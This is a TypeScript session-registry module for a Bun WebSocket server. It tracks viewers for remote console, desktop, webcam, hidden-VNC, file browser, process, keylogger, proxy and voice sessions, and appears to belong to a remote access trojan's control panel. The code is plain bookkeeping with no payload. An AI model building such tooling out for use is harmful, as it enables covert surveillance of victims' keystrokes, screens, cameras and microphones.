import type { ServerWebSocket } from "bun";
import type {
  ConsoleSession,
  RemoteDesktopViewer,
  FileBrowserViewer,
  ProcessViewer,
  VoiceViewer,
  NotificationsViewer,
  KeyloggerViewer,
  SocketData,
} from "./types";

const consoleSessions = new Map<string, ConsoleSession>();
const rdSessions = new Map<string, RemoteDesktopViewer>();
const webcamSessions = new Map<string, RemoteDesktopViewer>();
const hvncSessions = new Map<string, RemoteDesktopViewer>(); // HVNC uses same structure as RD
const fileBrowserSessions = new Map<string, FileBrowserViewer>();
const processSessions = new Map<string, ProcessViewer>();
const notificationSessions = new Map<string, NotificationsViewer>();
const keyloggerSessions = new Map<string, KeyloggerViewer>();
const proxySessions = new Map<string, KeyloggerViewer>(); // Reusing KeyloggerViewer interface for consistency
const voiceSessions = new Map<string, VoiceViewer>();

export function addConsoleSession(session: ConsoleSession): void {
  consoleSessions.set(session.id, session);
}

export function getConsoleSession(
  sessionId: string,
): ConsoleSession | undefined {
  return consoleSessions.get(sessionId);
}

export function deleteConsoleSession(sessionId: string): boolean {
  return consoleSessions.delete(sessionId);
}

export function getConsoleSessionsByClient(clientId: string): ConsoleSession[] {
  return Array.from(consoleSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllConsoleSessions(): Map<string, ConsoleSession> {
  return consoleSessions;
}

export function addRdSession(session: RemoteDesktopViewer): void {
  rdSessions.set(session.id, session);
}

export function addWebcamSession(session: RemoteDesktopViewer): void {
  webcamSessions.set(session.id, session);
}

export function getWebcamSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return webcamSessions.get(sessionId);
}

export function deleteWebcamSession(sessionId: string): boolean {
  return webcamSessions.delete(sessionId);
}

export function getWebcamSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return Array.from(webcamSessions.values()).filter((s) => s.clientId === clientId);
}

export function getAllWebcamSessions(): Map<string, RemoteDesktopViewer> {
  return webcamSessions;
}

export function getRdSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return rdSessions.get(sessionId);
}

export function deleteRdSession(sessionId: string): boolean {
  return rdSessions.delete(sessionId);
}

export function getRdSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return Array.from(rdSessions.values()).filter((s) => s.clientId === clientId);
}

export function getAllRdSessions(): Map<string, RemoteDesktopViewer> {
  return rdSessions;
}

// ==================== HVNC SESSION MANAGEMENT ====================

export function addHvncSession(session: RemoteDesktopViewer): void {
  hvncSessions.set(session.id, session);
}

export function getHvncSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return hvncSessions.get(sessionId);
}

export function deleteHvncSession(sessionId: string): boolean {
  return hvncSessions.delete(sessionId);
}

export function getHvncSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return Array.from(hvncSessions.values()).filter((s) => s.clientId === clientId);
}

export function getAllHvncSessions(): Map<string, RemoteDesktopViewer> {
  return hvncSessions;
}

export function getHvncSessionCount(): number {
  return hvncSessions.size;
}

// ==================== FILE BROWSER SESSION MANAGEMENT ====================

export function addFileBrowserSession(session: FileBrowserViewer): void {
  fileBrowserSessions.set(session.id, session);
}

export function getFileBrowserSession(
  sessionId: string,
): FileBrowserViewer | undefined {
  return fileBrowserSessions.get(sessionId);
}

export function deleteFileBrowserSession(sessionId: string): boolean {
  return fileBrowserSessions.delete(sessionId);
}

export function getFileBrowserSessionsByClient(
  clientId: string,
): FileBrowserViewer[] {
  return Array.from(fileBrowserSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllFileBrowserSessions(): Map<string, FileBrowserViewer> {
  return fileBrowserSessions;
}

export function addProcessSession(session: ProcessViewer): void {
  processSessions.set(session.id, session);
}

export function getProcessSession(
  sessionId: string,
): ProcessViewer | undefined {
  return processSessions.get(sessionId);
}

export function deleteProcessSession(sessionId: string): boolean {
  return processSessions.delete(sessionId);
}

export function getProcessSessionsByClient(clientId: string): ProcessViewer[] {
  return Array.from(processSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllProcessSessions(): Map<string, ProcessViewer> {
  return processSessions;
}

export function addNotificationSession(session: NotificationsViewer): void {
  notificationSessions.set(session.id, session);
}

export function deleteNotificationSession(sessionId: string): boolean {
  return notificationSessions.delete(sessionId);
}

export function getAllNotificationSessions(): Map<string, NotificationsViewer> {
  return notificationSessions;
}

export function getConsoleSessionCount(): number {
  return consoleSessions.size;
}

export function getRdSessionCount(): number {
  return rdSessions.size;
}

export function getFileBrowserSessionCount(): number {
  return fileBrowserSessions.size;
}

export function getProcessSessionCount(): number {
  return processSessions.size;
}

export function getNotificationSessionCount(): number {
  return notificationSessions.size;
}

export function safeSendViewer(
  ws: ServerWebSocket<SocketData>,
  payload: any,
): boolean {
  try {
    ws.send(JSON.stringify(payload));
    return true;
  } catch (err) {
    return false;
  }
}

export function safeSendViewerFrame(
  ws: ServerWebSocket<SocketData>,
  bytes: Uint8Array,
  header?: any,
): number {
  try {
    const meta = JSON.stringify(header || {});
    const metaBytes = new TextEncoder().encode(meta);
    const metaLength = new Uint8Array(4);
    const view = new DataView(metaLength.buffer);
    view.setUint32(0, metaBytes.length, false);
    const buf = new Uint8Array(4 + metaBytes.length + bytes.length);
    buf.set(metaLength, 0);
    buf.set(metaBytes, 4);
    buf.set(bytes, 4 + metaBytes.length);
    ws.send(buf);
    return buf.length;
  } catch (err) {
    return 0;
  }
}

export function addKeyloggerSession(session: KeyloggerViewer): void {
  keyloggerSessions.set(session.id, session);
}

export function getKeyloggerSession(
  sessionId: string,
): KeyloggerViewer | undefined {
  return keyloggerSessions.get(sessionId);
}

export function deleteKeyloggerSession(sessionId: string): boolean {
  return keyloggerSessions.delete(sessionId);
}

export function getKeyloggerSessionsByClient(
  clientId: string,
): KeyloggerViewer[] {
  return Array.from(keyloggerSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
  return keyloggerSessions;
}

export function addProxySession(session: KeyloggerViewer): void {
  proxySessions.set(session.id, session);
}

export function getProxySession(
  sessionId: string,
): KeyloggerViewer | undefined {
  return proxySessions.get(sessionId);
}

export function deleteProxySession(sessionId: string): boolean {
  return proxySessions.delete(sessionId);
}

export function getProxySessionsByClient(
  clientId: string,
): KeyloggerViewer[] {
  return Array.from(proxySessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllProxySessions(): Map<string, KeyloggerViewer> {
  return proxySessions;
}

export function addVoiceSession(session: VoiceViewer): void {
  voiceSessions.set(session.id, session);
}

export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
  return voiceSessions.get(sessionId);
}

export function deleteVoiceSession(sessionId: string): boolean {
  return voiceSessions.delete(sessionId);
}

export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
  return Array.from(voiceSessions.values()).filter((s) => s.clientId === clientId);
}

export function getAllVoiceSessions(): Map<string, VoiceViewer> {
  return voiceSessions;
}
